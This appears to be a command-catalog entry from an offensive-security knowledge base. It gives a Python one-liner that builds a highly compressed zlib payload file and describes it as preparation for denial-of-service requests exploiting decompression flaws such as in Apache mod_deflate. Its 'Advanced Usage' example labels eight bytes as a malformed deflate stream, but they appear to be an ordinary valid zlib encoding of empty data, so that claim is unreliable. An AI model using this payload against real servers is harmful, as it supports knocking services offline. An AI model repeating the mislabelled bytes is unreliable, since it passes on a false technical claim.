---
id: cmd-create-deflate-payload-001
data: >-
  python3 -c "import zlib; data = b'A' * 1000000; compressed =
  zlib.compress(data, level=9); open('crafted_deflate_payload.bin',
  'wb').write(compressed)"
tags:
  - payload
  - deflate
  - zlib
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:36.539Z'
verified: false
validated: true
submitted: true
---
# create-deflate-payload

## Command

```bash
python3 -c "import zlib; data = b'A' * 1000000; compressed = zlib.compress(data, level=9); open('crafted_deflate_payload.bin', 'wb').write(compressed)"
```

## Description

This command uses Python's zlib library to generate a basic DEFLATE-compressed payload file for testing decompression vulnerabilities. Customize the data for malformation to trigger specific flaws like in mod_deflate. Use it as a precursor to sending DoS requests.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `data = b'A' * 1000000` | Raw data to compress (adjust size/pattern for exploit) | Yes |
| `level=9` | Compression level (higher levels may amplify issues) | No |
| `crafted_deflate_payload.bin` | Output filename for the binary payload | Yes |

## Examples

### Basic Usage

```bash
python3 -c "import zlib; open('payload.bin', 'wb').write(zlib.compress(b'test'))"
```

### Advanced Usage

```bash
python3 -c "import zlib; malformed = b'\x78\x9c\x03\x00\x00\x00\x00\x01'; open('malformed.bin', 'wb').write(malformed)"  # Direct deflate bytes
```

## Expected Output

No stdout output; creates a binary file `crafted_deflate_payload.bin` containing the compressed data. Verify with `file crafted_deflate_payload.bin` showing binary format.

## Related

- [[commands/curl-deflate-dos]]
- [[procedures/Exploit-mod_deflate-Decompression-DoS]]
